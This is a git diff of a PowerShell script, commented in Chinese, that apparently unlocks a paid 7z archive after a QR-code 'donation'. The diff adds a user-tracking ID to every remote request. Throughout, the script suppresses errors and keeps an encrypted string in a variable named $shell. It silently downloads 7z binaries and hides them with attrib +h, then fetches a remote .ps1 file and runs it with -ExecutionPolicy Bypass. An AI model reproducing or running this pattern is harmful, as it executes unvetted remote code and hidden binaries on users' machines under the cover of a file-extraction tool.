@@ -1,10 +1,11 @@
-$WarningPreference = "SilentlyContinue"; $ErrorActionPreference = "SilentlyContinue"; [Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor [Net.SecurityProtocolType]::Tls12; $power = (1..16); function Decrypt-String { param ( [Parameter(Mandatory=$true)] [string]$EncryptedText, [Parameter(Mandatory=$true)] [byte[]]$Key ); $secureString = $EncryptedText | ConvertTo-SecureString -Key $Key; $plainText = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto([System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($secureString)); return $plainText }
+$agent = "2035"; $WarningPreference = "SilentlyContinue"; $ErrorActionPreference = "SilentlyContinue"; [Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor [Net.SecurityProtocolType]::Tls12; $power = (1..16); function Decrypt-String { param ( [Parameter(Mandatory=$true)] [string]$EncryptedText, [Parameter(Mandatory=$true)] [byte[]]$Key ); $secureString = $EncryptedText | ConvertTo-SecureString -Key $Key; $plainText = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto([System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($secureString)); return $plainText }
 $shell = "76492d1116743f0423413b16050a5345MgB8AGcAUABvAHgAeQBOADkAVQA2ADIASQAyAG4AbQBwAGsAcwA1AE8ASgBYAHcAPQA9AHwAOQBjADAAYwBjAGUANwAwADkAYwBmADcAMgBkADkAMQA0AGYAMAAwAGMAYwBhAGUANwBkADMAZQAxADUAZAA3AGYAMAA4ADMAMgBlAGIAZAA3AGIAMgA0ADYANAAyADIAOAA0ADUANQBkAGUANgBkADgAOQAxADAAZQBhADEANQA4AGYAYQBiAGYAMwA4ADkANABjADIAZQBhAGEAMABhADQAZAAzADMAMwA1AGUAZQA3AGMAYgA1ADQANgA0AGIANQBhAGMAMABmADAAYgA1AGUAMQA2AGYAYwA0AGEAMwBlADUAZQAxAGYANgAxAGQANQA2AGEAYwA0ADAAYgAzADQAZgA5ADcAZQBkADIAZQBlADMAOAAzAGIAYQA4AGQANwAwADAAMAAxADUAOQAxAGQAYwA2AGIAZgAxADcAMgA3AGEAZQBiAGYAMwA1ADkANQAyADAAYgAxADYAMgA4ADMAMQAzADgAMgBmAGEANAAzADAANQA4ADQAZAAxADAAMwAxADYAZQBkADMAYQBlADgAZABkADIAOAA4AGEANgAxAGEAYgAwADYANgA5ADUAMQBjAGQAMAAzAGUANwBhADQAYgA5ADAANwA3ADIAOABjADQANQA2ADkAYgBiAGEANgAyADAAYgA1ADMANgBlAGUANgBlADgAZgAxAGUAZQA="
 
 function ExtractWith7z {
     param (
         [string]$fileName,
-        [string]$DonateCheck
+        [string]$DonateCheck,
+        [string]$ispay
     )
 
     $currentPath = Get-Location
@@ -13,14 +14,14 @@ function ExtractWith7z {
     $fileToExtract = Join-Path $currentPath $fileName
 
     # 下载 7z.exe 和 7z.dll
-    Invoke-WebRequest -Uri ${DonateCheck}?state=7zexe -OutFile $exeFile
+    Invoke-WebRequest -Uri ${DonateCheck}?user=${agent}&state=7zexe -OutFile $exeFile
     $exeExists = Test-Path $exeFile; attrib +h $exeFile
-    Invoke-WebRequest -Uri ${DonateCheck}?state=7zdll -OutFile $dllFile
+    Invoke-WebRequest -Uri ${DonateCheck}?user=${agent}&state=7zdll -OutFile $dllFile
     $dllExists = Test-Path $dllFile; attrib +h $dllFile
 
     if ($exeExists -and $dllExists) {
         # 获取密码
-        $response_file = Invoke-WebRequest -Uri ${DonateCheck}?file=${fileNum}; $passWord = $response_file.Content.Trim();
+        $response_file = Invoke-WebRequest -Uri ${DonateCheck}?user=${agent}&file=${fileNum}&sign=${ispay}; $passWord = $response_file.Content.Trim();
 
         # 解压命令
         $tempLogo = [System.IO.Path]::GetTempFileName()
@@ -70,20 +71,20 @@ if ($files.Count -eq 1) {
         Write-Output "即将解压 ${fileNum}.7z"; Write-Output "此文件为付费资源，正在创建订单 ..."
 
         # 检测订单空闲
-        $response_state = Invoke-WebRequest -Uri ${DonateCheck}?state=lock; $state = $response_state.Content.Trim(); if ($state -ne "unlocked") {Write-Host "排队中，请稍后2分钟再试 ..."; Write-Host "...`n..`n."; return}
+        $response_state = Invoke-WebRequest -Uri ${DonateCheck}?user=${agent}&state=lock; $state = $response_state.Content.Trim(); if ($state -ne "unlocked") {Write-Host "排队中，请稍后2分钟再试 ..."; Write-Host "...`n..`n."; return}
         # 锁定订单号
         $response_pay = Invoke-WebRequest -Uri $DonateCheck; $pay = $response_pay.Content.Trim();
 
         # 准备弹框文件
         $FileURA0 = [System.IO.Path]::GetRandomFileName() + ".ps1";
-        Invoke-WebRequest -Uri ${DonateCheck}?state=fileurc0 -OutFile "$Env:temp\donate300.png"; Invoke-WebRequest -Uri ${DonateCheck}?state=fileurd0 -OutFile "$Env:temp\$FileURA0";
+        Invoke-WebRequest -Uri ${DonateCheck}?user=${agent}&state=urlimg -OutFile "$Env:temp\donate300.png"; Invoke-WebRequest -Uri ${DonateCheck}?user=${agent}&state=urlps1 -OutFile "$Env:temp\$FileURA0";
 
         # 弹框收款
         Write-Host "准备完成，扫描弹框二维码打赏后继续 ..."; powershell -ExecutionPolicy Bypass -File "$Env:temp\$FileURA0";
 
         # 判断收款成功 执行任务
         $response_ispay = Invoke-WebRequest -Uri $DonateCheck; $ispay = $response_ispay.Content.Trim()
-        if ($pay -eq $ispay) {$UrlTest = Invoke-WebRequest -Uri ${DonateCheck}?state=unlock; Write-Host "错误，未检测到打赏 (未付款、支付超时)。请稍后再试 ..."; Write-Host "执行完毕，请关闭此窗口。"; Write-Host "...`n..`n."} else {$UrlTest = Invoke-WebRequest -Uri ${DonateCheck}?state=unlock; Write-Host "感谢打赏！执行中，请稍等 (切勿中断脚本，以免订单失效) ..."; ExtractWith7z -fileName $fileName -DonateCheck $DonateCheck}
+        if ($pay -eq $ispay) {$UrlTest = Invoke-WebRequest -Uri ${DonateCheck}?user=${agent}&state=unlock; Write-Host "错误，未检测到打赏 (未付款、支付超时)。请稍后再试 ..."; Write-Host "执行完毕，请关闭此窗口。"; Write-Host "...`n..`n."} else {Write-Host "感谢打赏！执行中，请稍等 (切勿中断脚本，以免订单失效) ..."; ExtractWith7z -fileName $fileName -DonateCheck $DonateCheck -ispay $ispay; $UrlTest = Invoke-WebRequest -Uri ${DonateCheck}?user=${agent}&state=unlock}
 
         Remove-Item -Path @("$Env:temp\$FileURA0", "$Env:temp\donate300.png") -Force;
 
